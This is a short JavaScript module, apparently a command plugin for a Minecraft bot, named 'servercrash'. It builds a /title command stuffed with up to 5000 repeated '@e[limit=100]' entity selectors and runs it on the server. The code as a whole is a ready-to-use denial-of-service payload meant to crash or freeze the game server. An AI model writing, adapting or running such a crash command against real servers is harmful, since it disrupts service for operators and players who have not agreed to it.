module.exports = {
    name: 'servercrash',
    description: 'Boom boom (admin only)',
    level: 2,

    async execute(ctx) {
        let n = 900;
        if (ctx.args.length) {
            const v = parseInt(ctx.args[0]);
            if (!isNaN(v) && v > 0) n = Math.min(v, 5000);
        }

        const selectors = Array(n).fill('{"selector":"@e[limit=100]"}').join(',');
        const cmd = `title @a title {"text":"noratbothello","color":"#ffccee","extra":[${selectors}]}`;

        try {
            ctx.core.run(cmd);
        } catch (e) {
            console.error('[ServerCrash]', e);
        }
    }
};